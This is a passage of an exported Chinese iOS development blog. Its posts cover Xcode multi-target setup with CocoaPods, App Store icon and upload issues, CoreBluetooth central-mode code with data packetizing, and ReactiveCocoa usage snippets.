    <content type="text"><![CDATA[祝你今天愉快，你明天的愉快留着我明天再祝。 ——王小波《爱你就像爱生命》 项目中复制添加Target注意点 以MultiTarget为例子，复制添加一个Target 如果使用Cocoapods管理项目依赖，一定要先把pods初始化后再复制Target 复制Target后需要重新设置Podfile文件的（多个Target依赖库） 添加文件和素材的时候注意对应的Target选择 打开需要添加Target的项目，选择对应的Target复制 复制完成后修改复制完生成的文件 选择中间的仅复制，复制完成后修改复制的文件 MultiTarget Copy –&gt; MultiTarget_Second MultiTarget-info.plist –&gt; info_second.plist 修改完之后需要选中当前的Target后General里面选择对应的修改后的文件info_second.plist 修改Schemes 的Target名称 MultiTarget Copy –&gt; MultiTarget_Second 配置不同的App图标和启动图 如果需要共用一套图标，注意勾选Target Membership 如果需要设置不同的图片素材对应不同的Target,注意选择不同版本的Target Membership 可以配置： Bundle identifier Display Name Version Bulid 证书 App图标和启动图标 配置不同的标记 配置复制后Target标识，如 TARGET_SECOND=1 注意Debug和Release模式都需要配置 重新配置Podfile文件，重新安装依赖库，如123456789platform :ios, &apos;9.0&apos;target &apos;MultiTarget&apos; do pod &apos;SVProgressHUD&apos;endtarget &apos;MultiTarget_Second&apos; do pod &apos;SVProgressHUD&apos;end 项目中实战 在文件中根据设置的Target标记，区分不同的Target 直接切换不同的Target，即可编译生成对应的app 测试代码逻辑同新建Target一样，直接采用之前的截图]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>Multi Target</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发多Target（一）：新建Target]]></title>
    <url>%2Farchives%2Fe016e61f.html</url>
    <content type="text"><![CDATA[在我周围，像我这种性格的人特多——在公众场合什么都不说，到了私下里却妙语连珠，换言之，对信得过的人什么都说，对信不过的人什么都不说。 ——王小波《沉默的大多数》 需求1: 需求不同, App分免费版和专业版 或者分国内版和国际版或者分企业版和App Store版除了个别页面不同, 其他构建页面都完全一样 思考: 第一种:新建两个项目工程开发,把相同的页面封装并拷贝到项目使用 第二种:在同一个项目中,建立两个不同的target进行开发 优劣: 第一种方式:项目之间独立分开,耦合和干扰度小,但是项目开发消耗有点大 第二种方式:节省项目资源拷贝,但是在配置文件和提交到git或者SVN仓库容易冲突 解决方案 使用多Target方式，在原有的基础上面New一个Target 需求2: App需要应对不同的测试需求：开发环境、测试环境、预发布环境、发布环境 需要不同环境的App可以同时运行，以对比不同版本之间的差异 需要不同环境的App运行后有不同的：App名称、图标、启动图等等 解决方案 使用多Target方式，在原有的基础上面Duplicate一个Target Cocoapods需要重新处理 如果项目使用了Cocoapods，那么增加Target后，不管是新建Target或者复制Target都需要处理Podfile文件 方式1123456789101112platform :ios, &quot;8.0&quot;target &quot;MultiTarget&quot; doworkspace &apos;MultiTarget&apos;link_with &apos;MultiTarget&apos;, &apos;MultiTarget_Second&apos;pod &apos;ReactiveCocoa&apos;, &apos;~&gt; 2.5&apos;pod &apos;SVProgressHUD&apos;pod &apos;Masonry&apos;end 方式2 （推荐）1234567891011source &apos;https://github.com/CocoaPods/Specs.git&apos;platform :ios, &apos;8.0&apos;target &apos;MultiTarget&apos; dopod &apos;SVProgressHUD&apos;pod &apos;GoogleMaps&apos;endtarget &apos;MultiTarget&apos; dopod &apos;SVProgressHUD&apos;pod &apos;BaiduMapKit&apos;end 项目中新建Target注意点 以MultiTarget项目为例子，添加一个Target 如果使用Cocoapods管理项目依赖，尽量先把pods初始化后再复制Target 复制Target后需要重新设置Podfile文件的 添加文件和素材的时候注意对应的Target选择 需要手动把另一个Target里面的需要的所有的.m文件和nib文件都在Target Membership 里面勾选 如果有多语言文件也需要在Target Membership 里面勾选 如果配置有pch文件、需要再新建的Target里面重新配置pch文件路径 需要单独配置一些info.plist选项，如网络ATS/权限声明等 需要重新设置一遍依赖Target已经设置过的一些控制面板的属性，如后台，定位，bitcode等 项目新建一个Target 继承配置 删除不需要的默认生成的文件和xib 修改AppDelegate名称，修改其继承自上一个Target的AppDelegate 修改程序启动调用父类的配置信息 修改父类AppDelegate文件权限 可以供两个Target访问 配置不同的标记 在需要配置的Target中添加标记, 如新增加的Target 添加TARGET_SECOND=1 注意Debug和Release模式都需要配置 配置对应的启动图和App图标素材 可以在不同的Targe种配置不同的App图标、启动图、以及其他图标 如果两个Target共用一套图标素材，则在需要共用的Assets.xcassets中的Target Membership中勾选需要共享的Target. 重新配置Podfile文件，重新安装依赖库，如123456789platform :ios, &apos;9.0&apos;target &apos;MultiTarget&apos; do pod &apos;SVProgressHUD&apos;endtarget &apos;MultiTarget_Second&apos; do pod &apos;SVProgressHUD&apos;end 项目中实战 删除项目每个Target中的Main interface 中的Main，不需要从XIB中加载，因为第二个Target是和第一个Target初始化入口相同，在Appdelegate中。 需要两个项目共享的.m xib文件都需要Target Membership中勾选需要共享的Target. 在文件中根据设置的Target标记，区分不同的Target 直接切换不同的Target，即可编译生成对应的app]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>Multi Target</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之AppStore篇]]></title>
    <url>%2Farchives%2F9b9b2c59.html</url>
    <content type="text"><![CDATA[App Store 上架图标规范及相关问题。 iOS开发之AppStore篇– 上架图片尺寸 需要一张通用的1024 x 1024 在App Store里面用 （xcode9 之前在App Store里面上传；xcode9之后在开发工具里面配置） 其格式必须为 JPG 或 PNG，最低分辨率至少为 72 DPI，并采用 RGB 色彩空间 不能包含图层或圆角 不能有透明像素和alpha通道 桌面图标 (app icon) for iPhone6 plus(@3x) : 180 x 180 // 命名规范：App-60@3x for iPhone 6/5s/5/4s/4(@2x) : 120 x 120 // 命名规范：App-60@2x 系统搜索框图标 (Spotlight search results icon) for iPhone6 plus(@3x) : 120 x 120 // 命名规范：Spotlight-40@3x for iPhone6/5s/5/4s/4(@2x) : 80 x 80 // 命名规范：Spotlight-40@2x 系统设置图标 (Settings icon) for iPhone6 plus(@3x) : 87 x 87 // 命名规范：Settings-29@3x for iPhone6/5s/5/4s/4(@2x) : 58 x 58 // 命名规范：Settings-29@2x 启动图片 (launch image) for iPhoen5s/5(@2x) : 640 x 1136 // 命名规范：LaunchImage-568h@2x for iPhone 6(@2x) : 750 x 1334 // 命名规范： LaunchImage-667h@2x for iPhone 6 plus (@3x) : 1242 x 2208 // 命名规范： LaunchImage-736h@3x for iPhoneX (@3x) : 1125 x 2436 // 命名规范： LaunchImage-812h@3x 预览和屏幕快照关于App Store上架电脑系统是测试版或者Xcode是测试版 打包上传出错报如下错误代码，最后通过重装系统（正式版）解决 注意即使用测试版系统或者Xcode打包的程序上传成功、最后上传到AppStore审核的时候也有可能被拒 1ERROR ITMS-90167: &quot;No .app bundles found in the package&quot; 项目中有静态库不支持bitcode上架打包错误1‘xxx/lib**SDK.a(**ForSDK.o)’does not contain bitcode. You must rebuild it with bitcode enabled (Xcodesetting ENABLE_BITCODE), obtain an updated library from the vendor, or disablebitcode for this target. for architecture arm64 解决方法 重新打包静态库，使之支持bitcode 如果静态库比较老，没法重新编译，就需要关闭xcode的bitcode功能 Target -&gt; Build Settings -&gt; Bulid option : Enable Bitcode 设置为NO 项目中有设置URL Schemes1error itms-90158: &quot;the following url schemes found in your app are not in the current format:[mqq://]. 可能是跳转的app id 不正确 app审核通过后AppStore依然搜索不到解决办法 偶尔审核通过但是搜索不到，一般是DNS缓存问题 需要等待苹果服务器刷新 可以通过下面的方法加速刷新 在价格与销售范围里面修改：价格 —&gt; 等级1（收费即可）、销售地区 全部取消只选择 -&gt; 中国, 保存，此时刷新app审核状态就会变为 pending contract（协商价格） 然后再在价格与销售范围里面修改：价格 —&gt; 等级0（app原来的价格 我这里是免费）、销售地区 全部选择 -&gt; 所有地区, 保存，此时刷新app审核状态就会变为 Ready for sale（可供销售） 等待大概半个到一个小时就可以在AppStore里面搜索到了 打包上传后再iTunes connect后台一直看不到上传的包文件 可能是info.plist里面需要配置的申请权限没有配置，这时会收到APPle发送的邮件解释的很清楚，但是有时可能appleID账号是老板的私人邮箱，老板收到又没有及时转发给你，这时候就要找老板问下是否有接收到邮件。 关于游客账户 除社交、和财产挂钩等app可以只提供注册后登录，其他app应视情况提供游客登录模式，在应用内限制游客账户的功能 如果不提供游客账号登录功能一般不会出问题，但是主要看人品，不能确定哪一版本就给拒了App Store 审核指南（中文） 关于和硬件相关的app 我们公司大部分都是和单片机等通讯的硬件产品，关于这类app，上架后需要录制软件和硬件的操作交互视频上传YouTube（建议）或者youku等平台，然后在iTunes connect 里面提供上传视频连接以供审核。]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>App Store</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS蓝牙开发之中心设备篇]]></title>
    <url>%2Farchives%2Fa46fbeec.html</url>
    <content type="text"><![CDATA[当我跨过沉沦的一切，向着永恒开战的时候，你是我的军旗。—— 王小波《爱你就像爱生命》 关于蓝牙4.0 蓝牙4.0是由蓝牙技术联盟在2012年发布的最新蓝牙版本，较3.0版本更省电、成本低、延迟低、超长有效连接距离、AES-128加密等。蓝牙4.0设备因为低耗电，所以也叫做BLE （Bluetooth Low Energy）。 支持两种部署方式：双模式和单模式。 双模式包含传统蓝牙部分（Classsic Bluetooth）和低功耗蓝牙部分（Bluetooth Low Energy 即BLE)。 在BLE4.0之前，连接的蓝牙设备是需要经过MFI认证的 MFI – Make For ipad ,iphone, itouch 等专们为苹果设备制作的设备 Apple设备对BLE4.0支持 iPhone4S及以后的设备 第三代iPad及以后的设备 iMac、MacBookAir、MacBook Pro等 系统是从iOS6开始支持BLE4.0 CoreBluetooth框架 CoreBluetooth是Apple基于蓝牙4.0标准封装的一套蓝牙开发框架，也就是说使用CoreBluetooth开发的时候，对应的蓝牙设备必须也遵循蓝牙4.0。 CoreBluetooth开发分两种模式 中心模式（Central）: 接收周边蓝牙发来的广播数据。 外设模式（Peripheral）: 自己作为蓝牙设备，对外广播数据。 一个外部设备包含一个或多个服务，一个服务包含一个或多个特征。 中心模式的开发流程 建立中心管理者 扫描外设 连接外设 扫描外设中的服务和特征 获取外设的services 获取外设的Characteristics,获取Characteristics的值，获取Characteristics的Descriptor和Descriptor的值 订阅Characteristic 与外设做数据交互(explore and interact) 断开连接(disconnect) 初始化 使用蓝牙需要在inof.plist文件配置Privacy - Bluetooth Peripheral Usage Description KEY向用户请求蓝牙权限 导入蓝牙开发框架遵守两个协议 初始化一个中心设备管理者并设置代理 12345678910#import &lt;CoreBluetooth/CoreBluetooth.h&gt;@interface XSBleManager () &lt;CBCentralManagerDelegate, CBPeripheralDelegate&gt;/** 中心设备管理者 */@property (nonatomic, strong) CBCentralManager *centralManager;@end// 初始化并设置代理_centralManager = [[CBCentralManager alloc] initWithDelegate:self queue:nil]; 监听蓝牙状态改变 初始化蓝牙中心设备管理者之后，会检测并返回当前系统蓝牙状态 当蓝牙处于打开可用状态，我们就可以使用蓝牙发起扫描周边的外设了 1234567891011- (void)centralManagerDidUpdateState:(CBCentralManager *)central;// central.state 即是当前的蓝牙状态typedef NS_ENUM(NSInteger, CBManagerState) &#123; CBManagerStateUnknown = 0, CBManagerStateResetting, // 重置中 CBManagerStateUnsupported, // 不支持 CBManagerStateUnauthorized, // 未授权 CBManagerStatePoweredOff, // 关闭 CBManagerStatePoweredOn, // 打开&#125; NS_ENUM_AVAILABLE(10_13, 10_0); 扫描外设 扫描设别可以扫描周边所有的设备也可以根据服务UUID过滤掉不符合的设备，可根据需求选择 只在必要的时候设置 CBCentralManagerScanOptionAllowDuplicatesKey peripheral 每秒都在发送大量的数据包，scanForPeripheralsWithServices:options:方法会将同一 peripheral 发出的多个数据包合并为一个事件，然后每找到一个 peripheral 都会调用 centralManager:didDiscoverPeripheral:advertisementData:RSSI:方法。另外，当已发现的 peripheral 发送的数据包有变化时，这个代理方法同样会调用。 以上合并事件的操作是 scanForPeripheralsWithServices:options:的默认行为，即未设置 option参数。如果不想要默认行为，可将 option设置为 CBCentralManagerScanOptionAllowDuplicatesKey。设置以后，每收到广播，就会调用上面的回调（无论广播数据是否一样）。关闭默认行为一般用于以下场景：根据 peripheral 的距离来初始化连接（距离可用信号强度 RSSI 来判断）。设置这个 option会对电池寿命和 app 的性能产生不利影响，所以一定要在必要的时候，再对其进行设置。 1234// 方式1 ：扫描所有设备 [_centralManager scanForPeripheralsWithServices:nil options:nil];// 方式2 ：扫描特定的服务的设备 服务UUID可以查询公司文档或者和硬件工程师沟通[_centralManager scanForPeripheralsWithServices:@[[CBUUID UUIDWithString:ServiceUUIDString1], [CBUUID UUIDWithString:ServiceUUIDString2]] options:@&#123; CBCentralManagerScanOptionAllowDuplicatesKey:@YES &#125;]; 扫描成功后就会调用如下方法将外设的名称、标识、信号强度、状态等信息返回 可以在此方法筛选和过滤扫描到的设备，如根据公司外设的命名规定和搜索到的设备名称对比，过滤掉一些不符合的设备 注意点： 如果需要获取蓝牙的名称，推荐从advertisementData中获取，而不要直接获取aPeripheral中的，因为有时候蓝牙设备修改名称 peripheral.name 不会立即刷新，而advertisementData会实时刷新 iOS框架是不能通过Mac地址直接连接蓝牙的而且Apple公司也屏蔽了设备的Mac地址，取代返回的是一个根据某些参数生成的UUID,这一点和安卓不同，并且iOS蓝牙连接外设获取的的唯一标识并不是绝对唯一的: 重启手机就可能导致设备的唯一标识发生变化，而且不同手机连接同一个设备获取到的蓝牙设备标识也是不同的 如果对连接的设备的唯一标识有特别的需求，可以通过和硬件工程师沟通将Mac地址放入advertisementData中来实现获取设备的Mac地址 1234567- (void)centralManager:(CBCentralManager *)central didDiscoverPeripheral:(CBPeripheral *)aPeripheral advertisementData:(NSDictionary *)advertisementData RSSI:(NSNumber *)RSSI&#123; if ([peripheral.namehasPrefix:@"XXX"] ) &#123; // 停止扫描 // 连接设备 &#125;&#125; 连接外设 扫描到外设，就可以发起连接了 注意：连接外设前，需要关闭扫描以省电并减少位置错误发生 12[_centralManager stopScan];// 停止扫描[manager connectPeripheral:peripheral options:nil]; // 连接设备 连接外设成功调用方法，在此方法可以开始扫描服务信息 注意：一定要设置代理，不然扫描到服务信息也不会有代理回调 123456- (void)centralManager:(CBCentralManager *)central didConnectPeripheral:(CBPeripheral *)peripheral&#123; XSLogFunc [peripheral setDelegate:self]; // 设置代理 [peripheral discoverServices:nil]; // 开始扫描服务&#125; 连接外设失败调用方法，此时需要清空代理 12345678- (void)centralManager:(CBCentralManager *)central didFailToConnectPeripheral:(CBPeripheral *)peripheral error:(NSError *)error&#123; XSLogFunc if (peripheral) &#123; peripheral.delegate = nil; peripheral = nil; &#125;&#125; 扫描到外设 扫描到外设服务时如果传入nil, 则代表扫描所有的外设服务 但实际上，你可能只需要其中的某几个。搜索全部的操作既耗时又耗电，所以应该提供一个要搜索的 service 的 UUID 数组 123[peripheral discoverServices:nil]; // 假设你只需要用到 peripheral 提供的众多 service 的两个，那么在搜索 service 的时候可以设置要搜索的 service 的 UUID// [peripheral discoverServices:@[firstServiceUUID, secondServiceUUID]]; 扫描到外设服务的回调 扫描扫服务信息后，既可以去扫描服务里面的特征 1234567- (void)peripheral:(CBPeripheral *)peripheral didDiscoverServices:(NSError *)error&#123; XSLogFunc for (CBService *aService in peripheral.services) &#123; [peripheral discoverCharacteristics:nil forService:aService]; // 扫描服务中的特征 &#125;&#125; 扫描特征 获取到对应的需要的特征，我们既可以对特征进行订阅或者和设别进行数据交互以及升级设备蓝牙信息等等操作 接收 characteristic 数据的方式有两种： 在需要接收数据的时候，调用 readValueForCharacteristic:，这种是需要主动去接收的。 用 setNotifyValue:forCharacteristic:方法订阅，当有数据发送时，可以直接在回调中接收。 1234567891011121314151617181920212223242526272829- (void)peripheral:(CBPeripheral *)peripheral didDiscoverCharacteristicsForService:(CBService *)service error:(NSError *)error&#123; XSLogFunc if (error) &#123; XSLog(@"搜索Characteristic失败:%@", peripheral.services); return; &#125; for (CBCharacteristic *characteristic in service.characteristics) &#123; XSLog(@"搜索到的服务：%@ 对应的所有：Characteristic:%@", service, characteristic); // 具体的特征值的作用请参考公司文档或者和公司硬件工程师沟通 // 可订阅的特征// if ([characteristic.UUID.UUIDString isEqualToString:CharacteristicNotifyUUIDString]) &#123;// [peripheral setNotifyValue:YES forCharacteristic:characteristic];//// &#125; // OTA升级特征// if ([characteristic.UUID.UUIDString isEqual:CharacteristicWriteOTAUUIDString]) &#123;//// &#125; // 可写的特征// if ([characteristic.UUID.UUIDString isEqual:CharacteristicWriteUUIDString]) &#123;//// &#125; &#125;&#125; 特征值类型 123456789101112typedef NS_OPTIONS(NSUInteger, CBCharacteristicProperties) &#123; CBCharacteristicPropertyBroadcast = 0x01, CBCharacteristicPropertyRead = 0x02, CBCharacteristicPropertyWriteWithoutResponse = 0x04, CBCharacteristicPropertyWrite = 0x08, CBCharacteristicPropertyNotify = 0x10, CBCharacteristicPropertyIndicate = 0x20, CBCharacteristicPropertyAuthenticatedSignedWrites = 0x40, CBCharacteristicPropertyExtendedProperties = 0x80, CBCharacteristicPropertyNotifyEncryptionRequired NS_ENUM_AVAILABLE(NA, 6_0) = 0x100, CBCharacteristicPropertyIndicateEncryptionRequired NS_ENUM_AVAILABLE(NA, 6_0) = 0x200&#125;; 读取特征的数据 characteristic 包含了 service 要传输的数据。例如温度设备中表达温度的 characteristic，就可能包含着当前温度值。这时我们就可以通过读取 characteristic，来得到里面的数据。 当找到 characteristic 之后，可以通过调用CBPeripheral的readValueForCharacteristic:方法来进行读取。 当你调用上面这方法后，会回调peripheral:didUpdateValueForCharacteristic:error:方法，其中包含了要读取的数据。如果读取正确，可以用以下方式来获得值： 1234- (void)peripheral:(CBPeripheral *)peripheral didUpdateValueForCharacteristic:(CBCharacteristic *)characteristic error:(NSError *)error &#123; NSData *data = characteristic.value; // parse the data as needed&#125; 注意，不是所有 characteristic 的值都是可读的，你可以通过CBCharacteristicPropertyReadoptions 来进行判断（这个枚举会在下一章中介绍到）。如果你尝试读取不可读的数据，那上面的代理方法会返回相应的 error。 订阅 Characteristic 数据 其实使用readValueForCharacteristic:方法并不是实时的。考虑到很多实时的数据，比如心率这种，那就需要订阅 characteristic 了。 可以通过调用CBPeripheral的setNotifyValue:forCharacteristic:方法来实现订阅，注意第一个参数是YES。 1[peripheral setNotifyValue:YES forCharacteristic:interestingCharacteristic]; 如果是订阅，成功与否的回调是peripheral:didUpdateNotificationStateForCharacteristic:error:，读取中的错误会以 error 形式传回： 当然也不是所有 characteristic 都允许订阅，依然可以通过CBCharacteristicPropertyNoifyoptions 来进行判断 123456- (void)peripheral:(CBPeripheral *)peripheral didUpdateNotificationStateForCharacteristic:(CBCharacteristic *)characteristic error:(NSError *)error &#123; if (error) &#123; XSLog(@"Error changing notification state: %@", [error localizedDescription]); &#125;&#125; 数据写入特征 写数据其实是一个很常见的需求，如果 characteristic 可写，你可以通过CBPeripheral类的writeValue:forCharacteristic:type:方法来向设备写入NSData数据。 CBCharacteristicWriteWithResponse 指定写入成功后回调代理方法 CBCharacteristicWriteWithoutResponse 指定写入成功后不需要回调代理方法 1[_connectedPeripheral writeValue:data forCharacteristic:toCharacteristic type:CBCharacteristicWriteWithResponse]; 如果写入成功后要回调，那么回调方法是peripheral:didWriteValueForCharacteristic:error:。如果写入失败，那么会包含到 error 参数返回。 注意：characteristic 也可能并不支持写操作，可以通过CBCharacteristic的properties属性来判断。 1- (void)peripheral:(CBPeripheral *)peripheral didWriteValueForCharacteristic:(CBCharacteristic *)characteristic error:(NSError *)error; 关于数据分包及数据校验的一些扩展 蓝牙4.0因为是低功耗的，所以数据发送的效率就没有之前版本蓝牙的收发效率高，每次接收和发送数据不能超过20个字节 1、写入数据：如果想最大程度的的发挥蓝牙的效率，就需要对发送的数据进行分包处理并且尽可能保证除去协议所占的字节后每包携带的有效数据长度比较大 假设我们发送的每一包数据协议格式为：header(1Byte) + Length(1Byte) + cmd(1Byte) + paramData（&lt;= 16Byte） + check(1Byte) 如果需要发送的数据小于16个字节，直接按协议组装数据发送 如果需要发送的数据大于16个字节，需要按16个字节分包后按协议组装数据发送 1234567891011121314151617181920212223242526272829303132333435363738394041/** 写入不分包数据 @param data 数据 @param toCharacteristic 要写入的特征值 */- (void)writeSinglePacketData:(NSData *)data toCharacteristic:(CBCharacteristic *)toCharacteristic &#123; if (!toCharacteristic || !_bleClient.isBleConnected || kObjectIsEmpty(data)) &#123; return; &#125; self.isContinueWriting = NO; // 是否需要继续写入数据 [_bleClient.connectedPeripheral writeValue:data forCharacteristic:toCharacteristic type:CBCharacteristicWriteWithResponse];&#125;/** 写入需要分包数据 @param data 需要分包发送数据 @param toCharacteristic 要写入的特征值 */- (void)writeMultiplePacketData:(NSData *)data toCharacteristic:(CBCharacteristic *)toCharacteristic &#123; if (!toCharacteristic || !_bleClient.isBleConnected || kObjectIsEmpty(data)) &#123; return; &#125; self.isContinueWriting = YES; // 是否需要继续写入数据 self.subdataOffset = 0; // 已经截取的数据长度 self.needSubData = data; // 需要分包的数据 [self writeSubDataToCharacteristic:toCharacteristic];&#125;/** 将截取的数据发送出去 */- (void)writeSubDataToCharacteristic:(CBCharacteristic *)characteristic &#123; NSInteger totalLength = self.needSubData.length; NSInteger remainLength = totalLength - self.subdataOffset; NSInteger rangLength = remainLength &gt; XSCentralmanagerOTADataSubLength ? XSCentralmanagerOTADataSubLength:remainLength; NSData *data = [self.needSubData subdataWithRange:NSMakeRange(self.subdataOffset, rangLength)]; self.subdataOffset += data.length; if (kObjectIsEmpty(data)) &#123; // 通知代理写入错误 XSLog(@"没有数据可以写入了。。。✍️✍️✍️"); return; &#125; // 继续写入数据 [_bleClient.connectedPeripheral writeValue:data forCharacteristic:characteristic type:CBCharacteristicWriteWithResponse];&#125; self.isContinueWriting标记在每包数据写入成功的回调- (void)blePeripheral:(CBPeripheral *)peripheral didWriteValueForCharacteristic:(CBCharacteristic *)characteristic error:(NSError *)error里面是否继续写入下一包数据 2、接收数据：如果接受的数据过大，也会是分包接收到。 所以就需要在接收蓝牙数据的地方，校验接收到的每一包数据长度以确保数据接收完整 可以创建一个数据接收蓝牙数据校验的工具单例 将数据协议定义为一个枚举 提供一个方法传入蓝牙接收到的数据以及一个数据接收完整的回调结果block 每次的数据都按协议进行校验并缓存中间的有效数据 如果已经接收到的有效数据和数据总长度（协议中的发送长度字节）不相同就继续等待接收 如果已经接收到的有效数据和数据总长度（协议中的发送长度字节）相同就代表数据接收完整、回调block 1234567891011121314151617181920212223242526272829303132333435// 在接收到蓝牙数据的方法校验数据- (void)blePeripheral:(CBPeripheral *)peripheral didUpdateValueForCharacteristic:(CBCharacteristic *)characteristic error:(NSError *)error &#123; XSLogFunc if (error) &#123; XSLog(@"读取Characteristic数据失败:%@", error); return; &#125; NSData *value = characteristic.value; XSLog(@"读取到特征的数据:%@", value); // 接收到的数据完整性校验 [[XSVerifyBleDataTool shareInstance] handleReceivedDataWithData:value complete:^&#123; NSInteger responseType = XSBleVerifyUtility.responseCmd; if (_dispatchCmdComplete) &#123; _dispatchCmdComplete(responseType); &#125; &#125;];&#125;// 数据校验工具单例XSVerifyBleDataTool提供给外界校验方法typedef NS_ENUM(NSUInteger, XSReceivedDataState) &#123; XSReceivedDataStateHeader, /**&lt; header */ XSReceivedDataStateLength,/**&lt; 数据总长度 */ XSReceivedDataStateData,/**&lt; 数据 */ XSReceivedDataStateCheckSum,/**&lt; 校验和 */&#125;;/** 处理蓝牙接收到的数据 @param receivedData 接收到的数据 @param complete 处理回调 */- (void)handleReceivedDataWithData:(NSData *)receivedData complete:(void (^)(void))complete; 3、关于指令调用 以为可能其他地方也会用到蓝牙，所以推荐把整个蓝牙连接及验证封装成一个蓝牙工具类 因为App和外设交互的指令也会比较多，可能会分散在项目的不同地方，而蓝牙数据的写入和接收都是在代理方法中回调，我的做法是把调用蓝牙指令写入数据的逻辑抽成公共的方法：传需要写入的数据，写入成功的回调Block(可以调用的指令，状态回调回去) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/** 派发蓝牙指令 @param command 蓝牙指令 @param paramData 是否需要发送参数 @param complete 指令响应后回调的block */- (void)dispatchCommand:(XSBleRequestState)command paramData:(NSData *)paramData completion:(void (^)(NSInteger resultCommand))complete &#123; _dispatchCmdComplete = complete; [self handleUniversalBleRequestWithProtocolHeader:XSProtocolHeaderBle bleCmd:command paramData:paramData];&#125;/** 派发蓝牙指令 @param protocolHeader 指令头 （区分不同的蓝牙协议） @param command 蓝牙指令 @param paramData 是否需要发送参数 @param complete 指令响应后回调的block */- (void)dispatchWithProtocolHeader:(XSProtocolHeader)protocolHeader command:(XSBleRequestState)command paramData:(NSData *)paramData completion:(void (^)(NSInteger resultCommand))complete &#123; _dispatchCmdComplete = complete; [self handleUniversalBleRequestWithProtocolHeader:protocolHeader bleCmd:command paramData:paramData];&#125;/** 发送蓝牙指令的通用处理方法(处理完数据后直接写入蓝牙) @param bleCmd 发送的蓝牙指令 @param paramData 发送的数据 */- (void)handleUniversalBleRequestWithProtocolHeader:(XSProtocolHeader)protocolHeader bleCmd:(XSBleRequestState)bleCmd paramData:(NSData *)paramData &#123; NSData *resultData = [NSData data]; if (kObjectIsEmpty(paramData)) &#123; resultData = [XSDataProtocol handleDataWithProtocolHeader:protocolHeader command:bleCmd]; &#125; else &#123; resultData = [XSDataProtocol handleDataWithProtocolHeader:protocolHeader command:bleCmd paramData:paramData]; // 按照约定的协议组装数据 &#125; if (resultData.length) &#123; XSLog(@"最终发送的指令数据：%@", resultData); if (resultData.length &gt; 20) &#123; [self writeMultiplePacketData:resultData toCharacteristic:_bleClient.writeCharacteristic]; &#125; else &#123; [self writeSinglePacketData:resultData toCharacteristic:_bleClient.writeCharacteristic]; &#125; &#125;&#125; 所以大概的写入逻辑就可以简化为 1234[_bleMgr dispatchCommand:XSBleRequestStatusBattery_Level paramData:nil completion:^(NSInteger resultCommand) &#123; // 获取电池电量 // ...... &#125; &#125;]; 关于后台模式 按照Apple的一贯尿性，打着保护隐私的名义限制各种Api和权限，如果想蓝牙在后台运行也是需要申请权限并配置的 App没有申请后台权限则在进入后台模式之后很快就会被挂起（按下home键，大约5秒，app进入suspended状态）。 当app处于挂起状态时，无法处理任何蓝牙相关的任务直到app进入前台（被用户唤醒）。 处于后台模式（backgroud state）或者悬挂模式（suspended state）时，作为中心设备，无法搜索和发现周边在广告的设备。作为外设时，无法广告，此时中心想要通过公开服务的特征去访问它的话都会报错。 具体的后台模式设置及恢复请参考 iOS BLE 开发小记 - 如何实现 CoreBluetooth 后台运行模式 关于Demo 需要Demo请点击这里下载 参考Apple官方文档iOS BLE 开发小记 - 如何实现 CoreBluetooth 后台运行模式]]></content>
      <categories>
        <category>iOS</category>
        <category>蓝牙</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>蓝牙</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS蓝牙开发之外设篇]]></title>
    <url>%2Farchives%2Fbd3ad682.html</url>
    <content type="text"><![CDATA[我时常回到童年，用一片童心来思考问题，很多烦恼的问题就变得易解。——王小波 《一只特立独行的猪》 占坑]]></content>
      <categories>
        <category>iOS</category>
        <category>蓝牙</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>蓝牙</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发ReactiveCocoa（七）：开发中常见用法]]></title>
    <url>%2Farchives%2F2a9c0fa5.html</url>
    <content type="text"><![CDATA[危楼高百尺，手可摘星辰。不敢高声语，恐惊天上人。 ——李白《夜宿山寺》 实际项目中的不同风格用法参考常用的写法用RAC替代 控件赋值也可以这么样用（类似于cell中设置）12345678910111213141516RAC(self.textLabel, text) = RACObserve(self, city.cityName); // 直接给label文字赋值RAC(self.imgView, image) = [[[RACObserve(self, city.thumbnailData) // 直接给imageView 赋值 ignore:nil] map:^id(id value) &#123; // 转换图片 return [[[RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123; UIImage *image = [UIImage imageWithData:value]; [subscriber sendNext:image]; [subscriber sendCompleted]; return nil; &#125;] subscribeOn:[RACScheduler scheduler]] deliverOn:[RACScheduler mainThreadScheduler]]; // 主线程更新&#125;]switchToLatest]; 转模型也可以这么用12345678910111213141516171819- (void)initSearchSubscrition &#123;[[self.searchSignal deliverOn:[RACScheduler mainThreadScheduler]] subscribeNext:^(RACTuple *jsonSearchResult) &#123; NSDictionary *response; if (jsonSearchResult.count) &#123; response = jsonSearchResult.first; &#125; NSArray *rawArray = response[@"geoNames"]; self.cities = [[[rawArray.rac_sequence // 获取的数据转rac_sequence (里面都是信号) map:^id(NSDictionary *rawDic) &#123; // 转模型 NSMutableDictionary *dic = [(NSDictionary *)rawDic mutableCopy]; City *city = [MTLJSONAdapter modelOfClass:City.class fromJSONDictionary:dic error:nil]; [self downloadImageForCity:city]; return city; &#125;] array] mutableCopy]; // 放进数组中 并拷贝新生成一份 &#125;]; [self.searchSignal subscribeError:^(NSError *error) &#123; self.statusMessage = @"offLine"; &#125;];&#125; 代理方法也可以这么调12345[[self rac_signalForSelector:@selector(didSaveDataCallback:) fromProtocol:@protocol(SaveDataCallBack)] subscribeNext:^(RACTuple *tuple) &#123; City *newCity = tuple.first; [self.viewModel.cities insertObject:newCity atIndex:0]; [self.geoTbl reloadData]; &#125;]; 多个渠道请求数据都返回才能进行下一步 可以这么组装1234567891011121314151617181920212223RACSignal *requestHot = [RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123; NSLog(@"请求最热商品"); [subscriber sendNext:@"获取最热商品"]; return nil; &#125;];RACSignal *requestNew = [RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123; 